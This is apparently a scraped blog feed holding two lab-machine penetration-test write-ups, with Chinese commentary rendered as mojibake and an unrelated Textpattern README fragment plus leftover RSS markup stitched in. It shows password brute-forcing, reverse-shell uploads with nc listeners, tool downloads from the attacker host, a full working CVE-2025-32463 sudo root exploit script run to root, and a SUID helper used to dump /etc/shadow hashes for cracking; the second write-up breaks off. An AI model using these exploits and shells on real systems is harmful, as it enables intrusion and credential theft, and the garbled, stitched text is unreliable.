See LICENSE.txt for terms and conditions.

Includes contributions licensed under the GNU Lesser General Public License.
See textpattern/lib/LICENSE-LESSER.txt for terms and conditions.

Includes contributions licensed under the New BSD License.
See textpattern/lib/LICENSE-BSD-3.txt for terms and conditions.


== About ==

Textpattern CMS is a flexible, elegant and easy-to-use content management
system. Textpattern is free and open source.


== Installing Textpattern ==

* Refer to INSTALL.txt for details.


== Upgrading Textpattern ==

* Refer to UPGRADE.txt for details.


== Resources ==

* Website:       https://textpattern.com/
* Support forum: https://forum.textpattern.com
* Documentation: https://docs.textpattern.com

* Social:        https://textpattern.com/twitter

* Development:   https://textpattern.com/github
* Contributing:  https://docs.textpattern.com/development/contributing

* Sponsor:       https://github.com/sponsors/textpattern
                 https://opencollective.com/textpattern-collective
* Donate:        https://textpattern.com/about/patrons
                                                  
```

Textpattern CMS 4.8.7Ôºågoogle‰∫Ü‰∏Ä‰∏ãÔºåÁúãÂà∞‰∫Ü‰∏Ä‰∏™ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÂíå‰∏ä‰º†ÊºèÊ¥ûÔºåÊâÄ‰ª•ËøòÊòØÈúÄË¶ÅÁàÜÁ†¥‰∏Ä‰∏ãÁî®Êà∑ÂØÜÁ†Å
![image-20250715211701681](https://7r1umphk.github.io/image/20250715211701938.webp)

ÁÇπËøôÈáå‰ºöË∑≥ËΩ¨ÁôªÂΩïÊàñËÄÖËÆøÈóÆ    http://textpattern.dsz/textpattern/

Èöè‰æøËæìÂÖ•ÁÇπÊäìÂåÖ

![image-20250715211818852](https://7r1umphk.github.io/image/20250715211819190.webp)

Âè™ÂèØ‰ª•Á°¨ÁàÜÔºåÂ∑®ÊÖ¢

![image-20250715212036753](https://7r1umphk.github.io/image/20250715212037141.webp)

![image-20250715212123475](https://7r1umphk.github.io/image/20250715212123818.webp)

ÂØÜÁ†ÅÂ∞±rockyou.txtÔºå‰∏çÊà™Âõæ‰∫Ü

ÁÑ∂ÂêéÂºÄÂêØÔºåÁ≠âÂ∞±Â•Ω‰∫Ü

![image-20250715212254371](https://7r1umphk.github.io/image/20250715212254743.webp)

admin:superman

![image-20250715212344044](https://7r1umphk.github.io/image/20250715212344398.webp)

‰∏ä‰º†‰∏Ä‰∏™reverse.php‰∏äÂéªÂ∞±Â•Ω‰∫Ü

kaliÁõëÂê¨

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nc -lvnp 8888           
listening on [any] 8888 ...
```

![image-20250715212430424](https://7r1umphk.github.io/image/20250715212430750.webp)

Âéªhttp://textpattern.dsz/files/

![image-20250715212454872](https://7r1umphk.github.io/image/20250715212455203.webp)

ÁÇπÂáªÔºåËΩ¨ÂúàÂúà

ÂõûÂéªÁúãÁõëÂê¨

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nc -lvnp 8888           
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.185] 38534
Linux 5ud0 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64 GNU/Linux
 09:24:54 up 14 min,  0 users,  load average: 0.00, 0.03, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (500): Inappropriate ioctl for device
bash: no job control in this shell
www-data@5ud0:/$ ls /home
ls /home
todd
www-data@5ud0:/$ su todd
su todd
Password: todd
su: Authentication failure
www-data@5ud0:/$ ls -la /opt
ls -la /opt
total 8
drwxr-xr-x  2 root root 4096 Jul  9 21:31 .
drwxr-xr-x 18 root root 4096 Jul 10 04:36 ..
www-data@5ud0:/$ find / -perm -4000 -type f 2&gt;/dev/null
find / -perm -4000 -type f 2&gt;/dev/null
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/local/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
```

ËØï‰∫Ü‰∏Ä‰∏ãÂº±ÂØÜÁ†Å‰∏çË°åÔºåÁÑ∂ÂêéÁúã‰∫Ü‰∏Ä‰∏ãsuidÔºåÂèëÁé∞Êúâ‰∏§‰∏™sudo

/usr/bin/sudo

/usr/local/bin/sudo

ÂØπÊØî‰∏Ä‰∏ã

```
www-data@5ud0:/$ diff /usr/bin/sudo /usr/local/bin/sudo
diff /usr/bin/sudo /usr/local/bin/sudo
Binary files /usr/bin/sudo and /usr/local/bin/sudo differ
```

ËÄå‰∏îËøô‰∏™Èù∂Êú∫ÂêçÂ≠óÂ∞±Âè´5ud0ÔºåÊâÄ‰ª•ÂæàÊÄÄÁñë

```
www-data@5ud0:/$ /usr/bin/sudo -V
/usr/bin/sudo -V
Sudo version 1.9.16p2
Sudoers policy plugin version 1.9.16p2
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.16p2
Sudoers audit plugin version 1.9.16p2
www-data@5ud0:/$ /usr/local/bin/sudo -V
/usr/local/bin/sudo -V
Sudo version 1.9.6
Sudoers policy plugin version 1.9.6
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.6
Sudoers audit plugin version 1.9.6
```

/usr/local/bin/sudoÊòØÊØîËæÉÊñ∞ÁöÑÁâàÊú¨Ôºå/usr/bin/sudoÊòØ1.9.16p2ÁöÑÔºåËøô‰∏™ÁâàÊú¨Â•ΩÂÉèÂâçÁ´ØÊó∂Èó¥ÁàÜÂá∫‰∫Ü‰∏Ä‰∏™ÊºèÊ¥ûÔºågoogle‰∏Ä‰∏ã

![image-20250715212901470](https://7r1umphk.github.io/image/20250715212901701.webp)

Áæ§ÈáåÂâçÊÆµÊó∂Èó¥‰πüÊèê‰∫Ü‰∏Ä‰∏ãÔºå‰∏çËøáÊàë‰ª¨Áé∞Âú®ÈúÄË¶ÅÂÖà~~Êãø‰∏™Áü•ÈÅìÂØÜÁ†ÅÁöÑÁî®Êà∑Ôºåwww-dataÁöÑÂØÜÁ†ÅÊàëÂèØ‰∏çÁü•ÈÅì~~ ÔºàÁ∫ØÂ∞è‰∏ëÔºåCVE-2025-32463‰∏çÈúÄË¶ÅÂØÜÁ†ÅÂ∞±ÂèØ‰ª•Âà©Áî®Ôºâ

toddÊ≤°ÊúâÊâæÂà∞‰ªÄ‰πàÊúâÊÑèÊÄùÁöÑ‰∏úË•øÔºåÈÇ£ÁàÜÁ†¥ÂØÜÁ†ÅÂêß

ÂÖàÁ®≥ÂÆö‰∏Ä‰∏ãshell

```
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm  
export TERM=xterm  
export SHELL=/bin/bash  
stty rows 24 columns 80
```

```
www-data@5ud0:/tmp$ busybox wget 192.168.205.128/rockyou.txt
Connecting to 192.168.205.128 (192.168.205.128:80)
rockyou.txt          100% |********************************|  133M  0:00:00 ETA
www-data@5ud0:/tmp$ busybox wget 192.168.205.128/suForce
Connecting to 192.168.205.128 (192.168.205.128:80)
suForce              100% |********************************|  2430  0:00:00 ETA
www-data@5ud0:/tmp$ chmod +x suForce 
www-data@5ud0:/tmp$ ./suForce 
            _____                          
 ___ _   _ |  ___|__  _ __ ___ ___   
/ __| | | || |_ / _ \| '__/ __/ _ \ 
\__ \ |_| ||  _| (_) | | | (_|  __/  
|___/\__,_||_|  \___/|_|  \___\___|  
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 code: d4t4s3c     version: v1.0.0
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 ‚ùì  Usage: suForce [OPTIONS]

 üåê  Get a user password with the su binary.

 üìã  Options:
       -u &lt;USER&gt;      Specify the username you want to attack.
       -w &lt;WORDLIST&gt;  Specify the path where the wordlist is located.
       -h             Display this help message and exit.

 üí°  Examples:
       suForce -u root -w rockyou.txt
       suForce -h 

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ

```

ÊàëËøôÂÅ∑‰∏™È∏°ÔºåÊàëÁü•ÈÅìÊòØ9000Ë°åÂ∑¶Âè≥ÁöÑÔºåÊàëÊèêÂèñ1wË°åÔºåÁÑ∂Âêé‰ªéÂêéÂæÄÂâçÁàÜÁ†¥

```
www-data@5ud0:/tmp$ head -n 10000 rockyou.txt |tac &gt; passwd.txt
www-data@5ud0:/tmp$ ls -al passwd.txt 
-rw-rw-rw- 1 www-data www-data 80577 Jul 15 09:41 passwd.txt
www-data@5ud0:/tmp$ ./suForce -u todd -w passwd.txt 
            _____                          
 ___ _   _ |  ___|__  _ __ ___ ___   
/ __| | | || |_ / _ \| '__/ __/ _ \ 
\__ \ |_| ||  _| (_) | | | (_|  __/  
|___/\__,_||_|  \___/|_|  \___\___|  
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 code: d4t4s3c     version: v1.0.0
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
üéØ Username | todd
üìñ Wordlist | passwd.txt
üîé Status   | 8/10000/0%/nopassword
üí• Password | nopassword
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ

```

Áôª‰∏äÂéª

```
www-data@5ud0:/tmp$ su todd
Password: 
todd@5ud0:/tmp$ id
uid=1000(todd) gid=1000(todd) groups=1000(todd)
```

https://github.com/pr0v3rbs/CVE-2025-32463_chwoot

ÊºèÊ¥ûpoc

```
#!/bin/bash
# sudo-chwoot.sh
# CVE-2025-32463 ‚Äì Sudo EoP Exploit PoC by Rich Mirch
#                  @ Stratascale Cyber Research Unit (CRU)
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd ${STAGE?} || exit 1

if [ $# -eq 0 ]; then
    # If no command is provided, default to an interactive root shell.
    CMD='/bin/bash'
else
    # Otherwise, use the provided arguments as the command to execute.
    CMD='$@'
fi

# Escape the command to safely include it in a C string literal.
# This handles backslashes and double quotes.
CMD_C_ESCAPED=$(printf '%s' '$CMD' | sed -e 's/\\/\\\\/g' -e 's/'/\\'/g')

cat &gt; woot1337.c&lt;&lt;EOF
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir('/');
  execl('/bin/sh', 'sh', '-c', '${CMD_C_ESCAPED}', NULL);
}
EOF

mkdir -p woot/etc libnss_
echo 'passwd: /woot1337' &gt; woot/etc/nsswitch.conf
cp /etc/group woot/etc
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

echo 'woot!'
sudo -R woot woot
rm -rf ${STAGE?}
```

Áõ¥Êé•Â§çÂà∂ËøõÂéªÔºå‰∏çÊÉ≥‰∏ãËΩΩ‰∫Ü

```
todd@5ud0:/tmp$ vim a.sh
todd@5ud0:/tmp$ head -n 5 a.sh 
#!/bin/bash
# sudo-chwoot.sh
# CVE-2025-32463 ‚Äì Sudo EoP Exploit PoC by Rich Mirch
#                  @ Stratascale Cyber Research Unit (CRU)
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
```

ÊîπÁÇπ‰∏úË•ø

![image-20250715214543419](https://7r1umphk.github.io/image/20250715214543644.webp)

ÊîπÊàêÊúâÊºèÊ¥ûÁöÑ

```
todd@5ud0:/tmp$ bash a.sh 
woot!
[sudo] password for todd: 
root@5ud0:/# id
uid=0(root) gid=0(root) groups=0(root),1000(todd)
root@5ud0:/# cat /root/root.txt /home/todd/user.txt 
flag{root-257f425d-1ea4-4b8e-8dd8-69523f25d249}
flag{user-80e68759-1ca0-45eb-82a7-601b1f78dfe5}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_5ud0.html</guid><pubDate>Tue, 15 Jul 2025 13:47:40 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_sudo</title><link>https://7r1UMPHK.github.io/post/nei-bu-_sudo.html</link><description>![image-20250711174235043](https://7r1umphk.github.io/image/20250711174242755.webp)

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l
[sudo] kali ÁöÑÂØÜÁ†ÅÔºö
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.175 08:00:27:14:e1:21       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fa:75:ed       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.997 seconds (128.19 hosts/sec). 4 responded
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p- 192.168.205.175
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-11 05:42 EDT
Nmap scan report for 192.168.205.175
Host is up (0.00015s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:14:E1:21 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.25 seconds
                       
```

Áúãweb

![image-20250711174336944](https://7r1umphk.github.io/image/20250711174337092.webp)

Ë∑≥ËΩ¨‰∏çËøáÂéªÔºåÊã¶‰∏Ä‰∏ãjsdelivrÁöÑ

![image-20250711174539493](https://7r1umphk.github.io/image/20250711174539834.webp)

Ë∑≥ËΩ¨Âà∞

![image-20250711174433367](https://7r1umphk.github.io/image/20250711174433533.webp)

nucleiÁúãÁúãÊû∂ÊûÑ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nuclei -u http://192.168.205.175/tinyfilemanager.php

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.4.5

                projectdiscovery.io

[INF] Current nuclei version: v3.4.5 (outdated)
[INF] Current nuclei-templates version: v10.2.4 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 67
[INF] Templates loaded for current scan: 8150
[INF] Executing 7946 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 204 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1761 (Reduced 1653 Requests)
[INF] Using Interactsh Server: oast.pro
[cookies-without-httponly] [javascript] [info] 192.168.205.175 ['filemanager']
[cookies-without-secure] [javascript] [info] 192.168.205.175 ['filemanager']
[waf-detect:apachegeneric] [http] [info] http://192.168.205.175/tinyfilemanager.php
[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.175:22
[ssh-password-auth] [javascript] [info] 192.168.205.175:22
[ssh-auth-methods] [javascript] [info] 192.168.205.175:22 ['['publickey','password']']
[ssh-server-enumeration] [javascript] [info] 192.168.205.175:22 ['SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3']
[openssh-detect] [tcp] [info] 192.168.205.175:22 ['SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3']
[form-detection] [http] [info] http://192.168.205.175/tinyfilemanager.php
[tiny-file-manager] [http] [info] http://192.168.205.175/tinyfilemanager.php/index.php
[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.175/tinyfilemanager.php
[tech-detect:jsdelivr] [http] [info] http://192.168.205.175/tinyfilemanager.php
[tech-detect:bootstrap] [http] [info] http://192.168.205.175/tinyfilemanager.php
[apache-detect] [http] [info] http://192.168.205.175/tinyfilemanager.php ['Apache/2.4.62 (Debian)']
[INF] Scan completed in 1m. 24 matches found.
                          
```

Êêú‰∏Ä‰∏ãÊúâÊ≤°ÊúâÊ¥û

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ searchsploit tiny file manager
------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                  |  Path
------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Manx 1.0.1 - '/admin/tiny_mce/plugins/ajaxfilemanager/ajax_get_file_listing.php' Multiple Cross-Site Scripting Vulnerabilities                  | php/webapps/36364.txt
Manx 1.0.1 - '/admin/tiny_mce/plugins/ajaxfilemanager_OLD/ajax_get_file_listing.php' Multiple Cross-Site Scripting Vulnerabilities              | php/webapps/36365.txt
MCFileManager Plugin for TinyMCE 3.2.2.3 - Arbitrary File Upload                                                                                | php/webapps/15768.txt
Tiny File Manager 2.4.6 - Remote Code Execution (RCE)                                                                                           | php/webapps/50828.sh
TinyMCE MCFileManager 2.1.2 - Arbitrary File Upload                                                                                             | php/webapps/15194.txt
------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ cd tmp                        
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ searchsploit -m php/webapps/50828.sh
  Exploit: Tiny File Manager 2.4.6 - Remote Code Execution (RCE)
      URL: https://www.exploit-db.com/exploits/50828
     Path: /usr/share/exploitdb/exploits/php/webapps/50828.sh
    Codes: CVE-2021-45010, CVE-2021-40964
 Verified: False
File Type: Unicode text, UTF-8 text
Copied to: /mnt/hgfs/gx/x/tmp/50828.sh


                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ bash /mnt/hgfs/gx/x/tmp/50828.sh

TIny File Manager Authenticated RCE Exploit.

By FEBIN

/mnt/hgfs/gx/x/tmp/50828.sh &lt;URL&gt; &lt;Admin Username&gt; &lt;Password&gt;

Example: /mnt/hgfs/gx/x/tmp/50828.sh http://files.ubuntu.local/index.php admin 'admin@123'

                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ bash /mnt/hgfs/gx/x/tmp/50828.sh http://192.168.205.175/tinyfilemanager.php admin 'admin@123'
/usr/bin/curl
[‚úî] Curl found! 
/usr/bin/jq
[‚úî] jq found! 

[+]  Login Success! Cookie: filemanager=70k14rakb4d73nos0gib5frd7d 
jq: parse error: Invalid numeric literal at line 1, column 14
[-] Can't find WEBROOT! Using default /var/www/html 
[-] File Upload Unsuccessful! Exiting! 
                                           
```

Â§±Ë¥•Ôºå‰ΩÜÊòØÈªòËÆ§ÂØÜÁ†ÅÁôªÂΩïÊàêÂäü‰∫ÜÔºåÊâÄ‰ª•Êàë‰ª¨ÂéªwebËá™Â∑±‰∏ä‰º†

![image-20250711175333897](https://7r1umphk.github.io/image/20250711175334236.webp)

Êàê‰∫ÜÔºå‰ªÄ‰πàÈôêÂà∂ÈÉΩÊ≤°ÊúâÔºåÁõ¥Êé•ËÆøÈóÆÔºåÊãøshellÔºàËøô‰∏™Êû∂ÊûÑ„ÄÇÁæ§‰∏ªÂ•ΩÂÉèÊâìËøáÔºâ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ nc -lnvp 8888                                       
listening on [any] 8888 ...

```

![image-20250711175447900](https://7r1umphk.github.io/image/20250711175448104.webp)

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ nc -lnvp 8888                                       
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.175] 55696
Linux Sudo 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64 GNU/Linux
 05:54:36 up 12 min,  0 users,  load average: 0.40, 4.74, 3.31
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (414): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Sudo:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@Sudo:/$ cd /h
cd /home/
www-data@Sudo:/home$ ls -al
ls -al
total 12
drwxr-xr-x  3 root  root  4096 Jul  9 04:41 .
drwxr-xr-x 18 root  root  4096 Mar 18 20:37 ..
drwxr-xr-x  2 eecho eecho 4096 Jul  9 04:42 eecho
www-data@Sudo:/home$ cd ee
cd eecho/
www-data@Sudo:/home/eecho$ ls -al
ls -al
total 24
drwxr-xr-x 2 eecho eecho 4096 Jul  9 04:42 .
drwxr-xr-x 3 root  root  4096 Jul  9 04:41 ..
lrwxrwxrwx 1 root  root     9 Jul  9 04:42 .bash_history -&gt; /dev/null
-rw-r--r-- 1 eecho eecho  220 Jul  9 04:41 .bash_logout
-rw-r--r-- 1 eecho eecho 3526 Jul  9 04:41 .bashrc
-rw-r--r-- 1 eecho eecho  807 Jul  9 04:41 .profile
-rw-r--r-- 1 root  root    44 Jul  9 04:42 user.txt
www-data@Sudo:/home/eecho$ su eecho
su eecho
Password: eecho
su: Authentication failure
www-data@Sudo:/home/eecho$ cat user.txt
cat user.txt
flag{user-e1930b4927e6b6d92d120c7c1bba3421}
www-data@Sudo:/home/eecho$ cd /opt 
cd /opt
www-data@Sudo:/opt$ ls -al
ls -al
total 8
drwxr-xr-x  2 root root 4096 Apr  1 08:59 .
drwxr-xr-x 18 root root 4096 Mar 18 20:37 ..
www-data@Sudo:/opt$ find / -perm -4000 -type f 2&gt;/dev/null
find / -perm -4000 -type f 2&gt;/dev/null
/usr/bin/chsh
/usr/bin/read_file
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
```

/usr/bin/read_file

```
www-data@Sudo:/opt$ ls -al /usr/bin/read_file
ls -al /usr/bin/read_file
-rwsr-sr-x 1 root root 17528 Jul  9 05:01 /usr/bin/read_file
www-data@Sudo:/opt$ strings /usr/bin/read_file
strings /usr/bin/read_file
/lib64/ld-linux-x86-64.so.2
4hhl
strncmp
perror
puts
printf
strlen
read
getopt
realpath
optarg
stderr
fwrite
close
open
__cxa_finalize
__libc_start_main
__xstat
__lxstat
libc.so.6
GLIBC_2.3
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
hu)H
[]A\A]A^A_
Usage: %s -f &lt;filepath&gt;
Options:
  -h         Show this help message
  -f &lt;file&gt;  Specify the file to view (must be under /etc)
Security restrictions:
  - File path must start with /etc/
  - Symbolic links and path traversal are blocked
  - Only regular files can be read
/etc/
Error: No arguments provided
Error: No file specified
Error: Path must start with /etc/
Error resolving path
Error: Resolved path is not under /etc/
Error checking file status
Error: Symbolic links are not allowed
Error checking resolved file
Error: Only regular files are allowed
Error opening file
Error reading file
Error writing to stdout
;*3$'
GCC: (Debian 10.2.1-6) 10.2.1 20210110
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
read_file.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
__stat
strncmp@GLIBC_2.2.5
_ITM_deregisterTMCloneTable
puts@GLIBC_2.2.5
_edata
strlen@GLIBC_2.2.5
__lxstat@GLIBC_2.2.5
printf@GLIBC_2.2.5
close@GLIBC_2.2.5
read@GLIBC_2.2.5
__libc_start_main@GLIBC_2.2.5
__data_start
is_etc_directory
optarg@GLIBC_2.2.5
__gmon_start__
__dso_handle
realpath@GLIBC_2.3
_IO_stdin_used
__xstat@GLIBC_2.2.5
__libc_csu_init
__bss_start
main
__lstat
open@GLIBC_2.2.5
perror@GLIBC_2.2.5
getopt@GLIBC_2.2.5
print_help
fwrite@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@GLIBC_2.2.5
stderr@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
```

ËøòÊúâÂ∏ÆÂä©ÊñáÊ°£Ôºå‰∏çÈîô‰∏çÈîô

```
www-data@Sudo:/opt$ /usr/bin/read_file -f /etc/shadow
/usr/bin/read_file -f /etc/shadow
root:$y$j9T$8u7tw.ivXZkGdXyV0Fs.d/$FfzoOYYu8sRq7K2smsiRh5UGsVU2mI8.Q3Vmk0VtzUA:20190:0:99999:7:::
daemon:*:20166:0:99999:7:::
bin:*:20166:0:99999:7:::
sys:*:20166:0:99999:7:::
sync:*:20166:0:99999:7:::
games:*:20166:0:99999:7:::
man:*:20166:0:99999:7:::
lp:*:20166:0:99999:7:::
mail:*:20166:0:99999:7:::
news:*:20166:0:99999:7:::
uucp:*:20166:0:99999:7:::
proxy:*:20166:0:99999:7:::
www-data:*:20166:0:99999:7:::
backup:*:20166:0:99999:7:::
list:*:20166:0:99999:7:::
irc:*:20166:0:99999:7:::
gnats:*:20166:0:99999:7:::
nobody:*:20166:0:99999:7:::
_apt:*:20166:0:99999:7:::
systemd-timesync:*:20166:0:99999:7:::
systemd-network:*:20166:0:99999:7:::
systemd-resolve:*:20166:0:99999:7:::
systemd-coredump:!!:20166::::::
messagebus:*:20166:0:99999:7:::
sshd:*:20166:0:99999:7:::
eecho:$6$mL.9/fVsBqItNR..$GyJfKOjLcovjApxygZ79CjKcqJmJ37jC8y9KeLq81fLAnNCYVP1Nw9d8Dp9pZi/l3CWJ3PHL1l/Hld3sFmZoQ.:20278:0:99999:7:::
```

ÁàÜÂá∫‰∫Ü‰∏Ä‰∏™eecho

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
